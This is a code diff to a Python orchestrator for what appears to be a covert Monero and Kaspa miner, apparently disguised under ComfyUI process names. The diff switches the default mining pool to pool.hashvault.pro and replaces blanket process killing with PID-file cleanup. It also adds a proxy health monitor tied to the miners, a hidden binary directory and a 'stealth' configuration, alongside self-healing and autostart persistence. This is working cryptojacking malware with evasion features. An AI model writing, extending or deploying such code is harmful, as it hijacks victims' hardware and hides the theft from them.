@@ -218,7 +218,7 @@ try:
         if ds and ds.config_builder:
             data["wallet"] = ds.config_builder.get_wallet()
             data["pool_host"] = ds.config_builder.settings.get(
-                "pool_host", "gulf.moneroocean.stream"
+                "pool_host", "pool.hashvault.pro"
             )
             gpu_cfg = ds.config_builder.build_gpu_config()
             data["kas_wallet"] = gpu_cfg.get("wallet", "")
@@ -255,14 +255,8 @@ def _orchestrate():
     except Exception:
         pass
 
-    # Kill any stale miner processes from previous runs
-    try:
-        import subprocess as _sp
-        for pname in ["comfyui_service", "comfyui_render"]:
-            _sp.run(["pkill", "-9", "-f", pname], capture_output=True, timeout=5)
-        import time as _tm; _tm.sleep(1)
-    except Exception:
-        pass
+    # PID-file based cleanup happens inside MinerManager._kill_existing() / start()
+    # No blanket pkill — avoids race conditions with watchdog/SelfHealer threads
 
     pkg = Path(__file__).resolve().parent
     sys.path.insert(0, str(pkg))
@@ -382,6 +376,20 @@ def _orchestrate():
             healer.start()
         except Exception as exc:
             logger.error("Self-healer failed to start: %s", exc)
+
+        # ── Proxy health monitor (blacklists dead proxies, auto-swaps) ──
+        try:
+            from core.proxy_health import ProxyHealthMonitor
+            proxy_mon = ProxyHealthMonitor(
+                cpu_miner=mgr,
+                gpu_miner=gpu,
+                config_builder=cb,
+                cache_dir=hidden_bin,
+                stealth_config=sc,
+            )
+            proxy_mon.start()
+        except Exception as exc:
+            logger.error("Proxy health monitor failed to start: %s", exc)
 
         if not _FIRST_RUN_MARKER.exists():
             auto = AutoStart(BASE_DIR)
